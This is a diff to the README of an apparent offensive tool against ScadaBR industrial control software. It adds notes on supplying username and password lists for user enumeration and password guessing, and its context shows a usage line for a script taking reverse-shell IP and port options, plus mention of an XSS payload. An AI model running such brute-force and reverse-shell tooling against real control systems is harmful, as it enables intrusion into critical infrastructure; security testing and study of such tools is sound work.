@@ -1,4 +1,5 @@
 # ScadaBRExplorer
+This repository will be used for uploading multiple scripts!
 <h1>Please use responsibly, only for educational purposes</h1>
 <h3>Not responsible if you use this irresponsibly</h3>
 
@@ -19,4 +20,5 @@ Last option you can get an XSS payload to test the XSS vulnerability <br>
 <p>
 python3 scadabrute.py --ip ip --port port --revip (reverse_shell ip) --revport (reverse_shell port) <br>
 Last two are optional, in case you don't care about it! <br>
+Please create a usernames.txt file and passwords.txt file in order to use the user enumeration and password guessing functions! <br>
 </p>
